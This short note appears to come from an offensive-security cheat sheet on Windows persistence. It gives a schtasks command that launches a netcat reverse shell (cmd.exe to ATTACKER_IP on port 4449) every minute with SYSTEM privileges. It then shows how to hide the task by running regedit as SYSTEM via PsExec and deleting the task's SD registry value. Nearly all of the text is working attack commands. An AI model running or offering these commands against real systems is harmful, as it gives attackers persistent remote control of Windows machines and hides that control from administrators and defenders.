
Create a new task
```CMD
schtasks /create /sc minute /mo 1 /tn TASK_NAME /tr "c:\tools\nc64 -e cmd.exe ATTACKER_IP 4449" /ru SYSTEM
```

The /sc and /mo options indicate that the task should be run every single minute. The /ru option indicates that the task will run with SYSTEM privileges.

Query a task
```CMD
schtasks /query /tn TASK_NAME
```


**Hiding the task**
```CMD
PsExec64.exe -s -i regedit
```

Go to 
```REG
HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\TASK_NAME
```

Delete the SD key




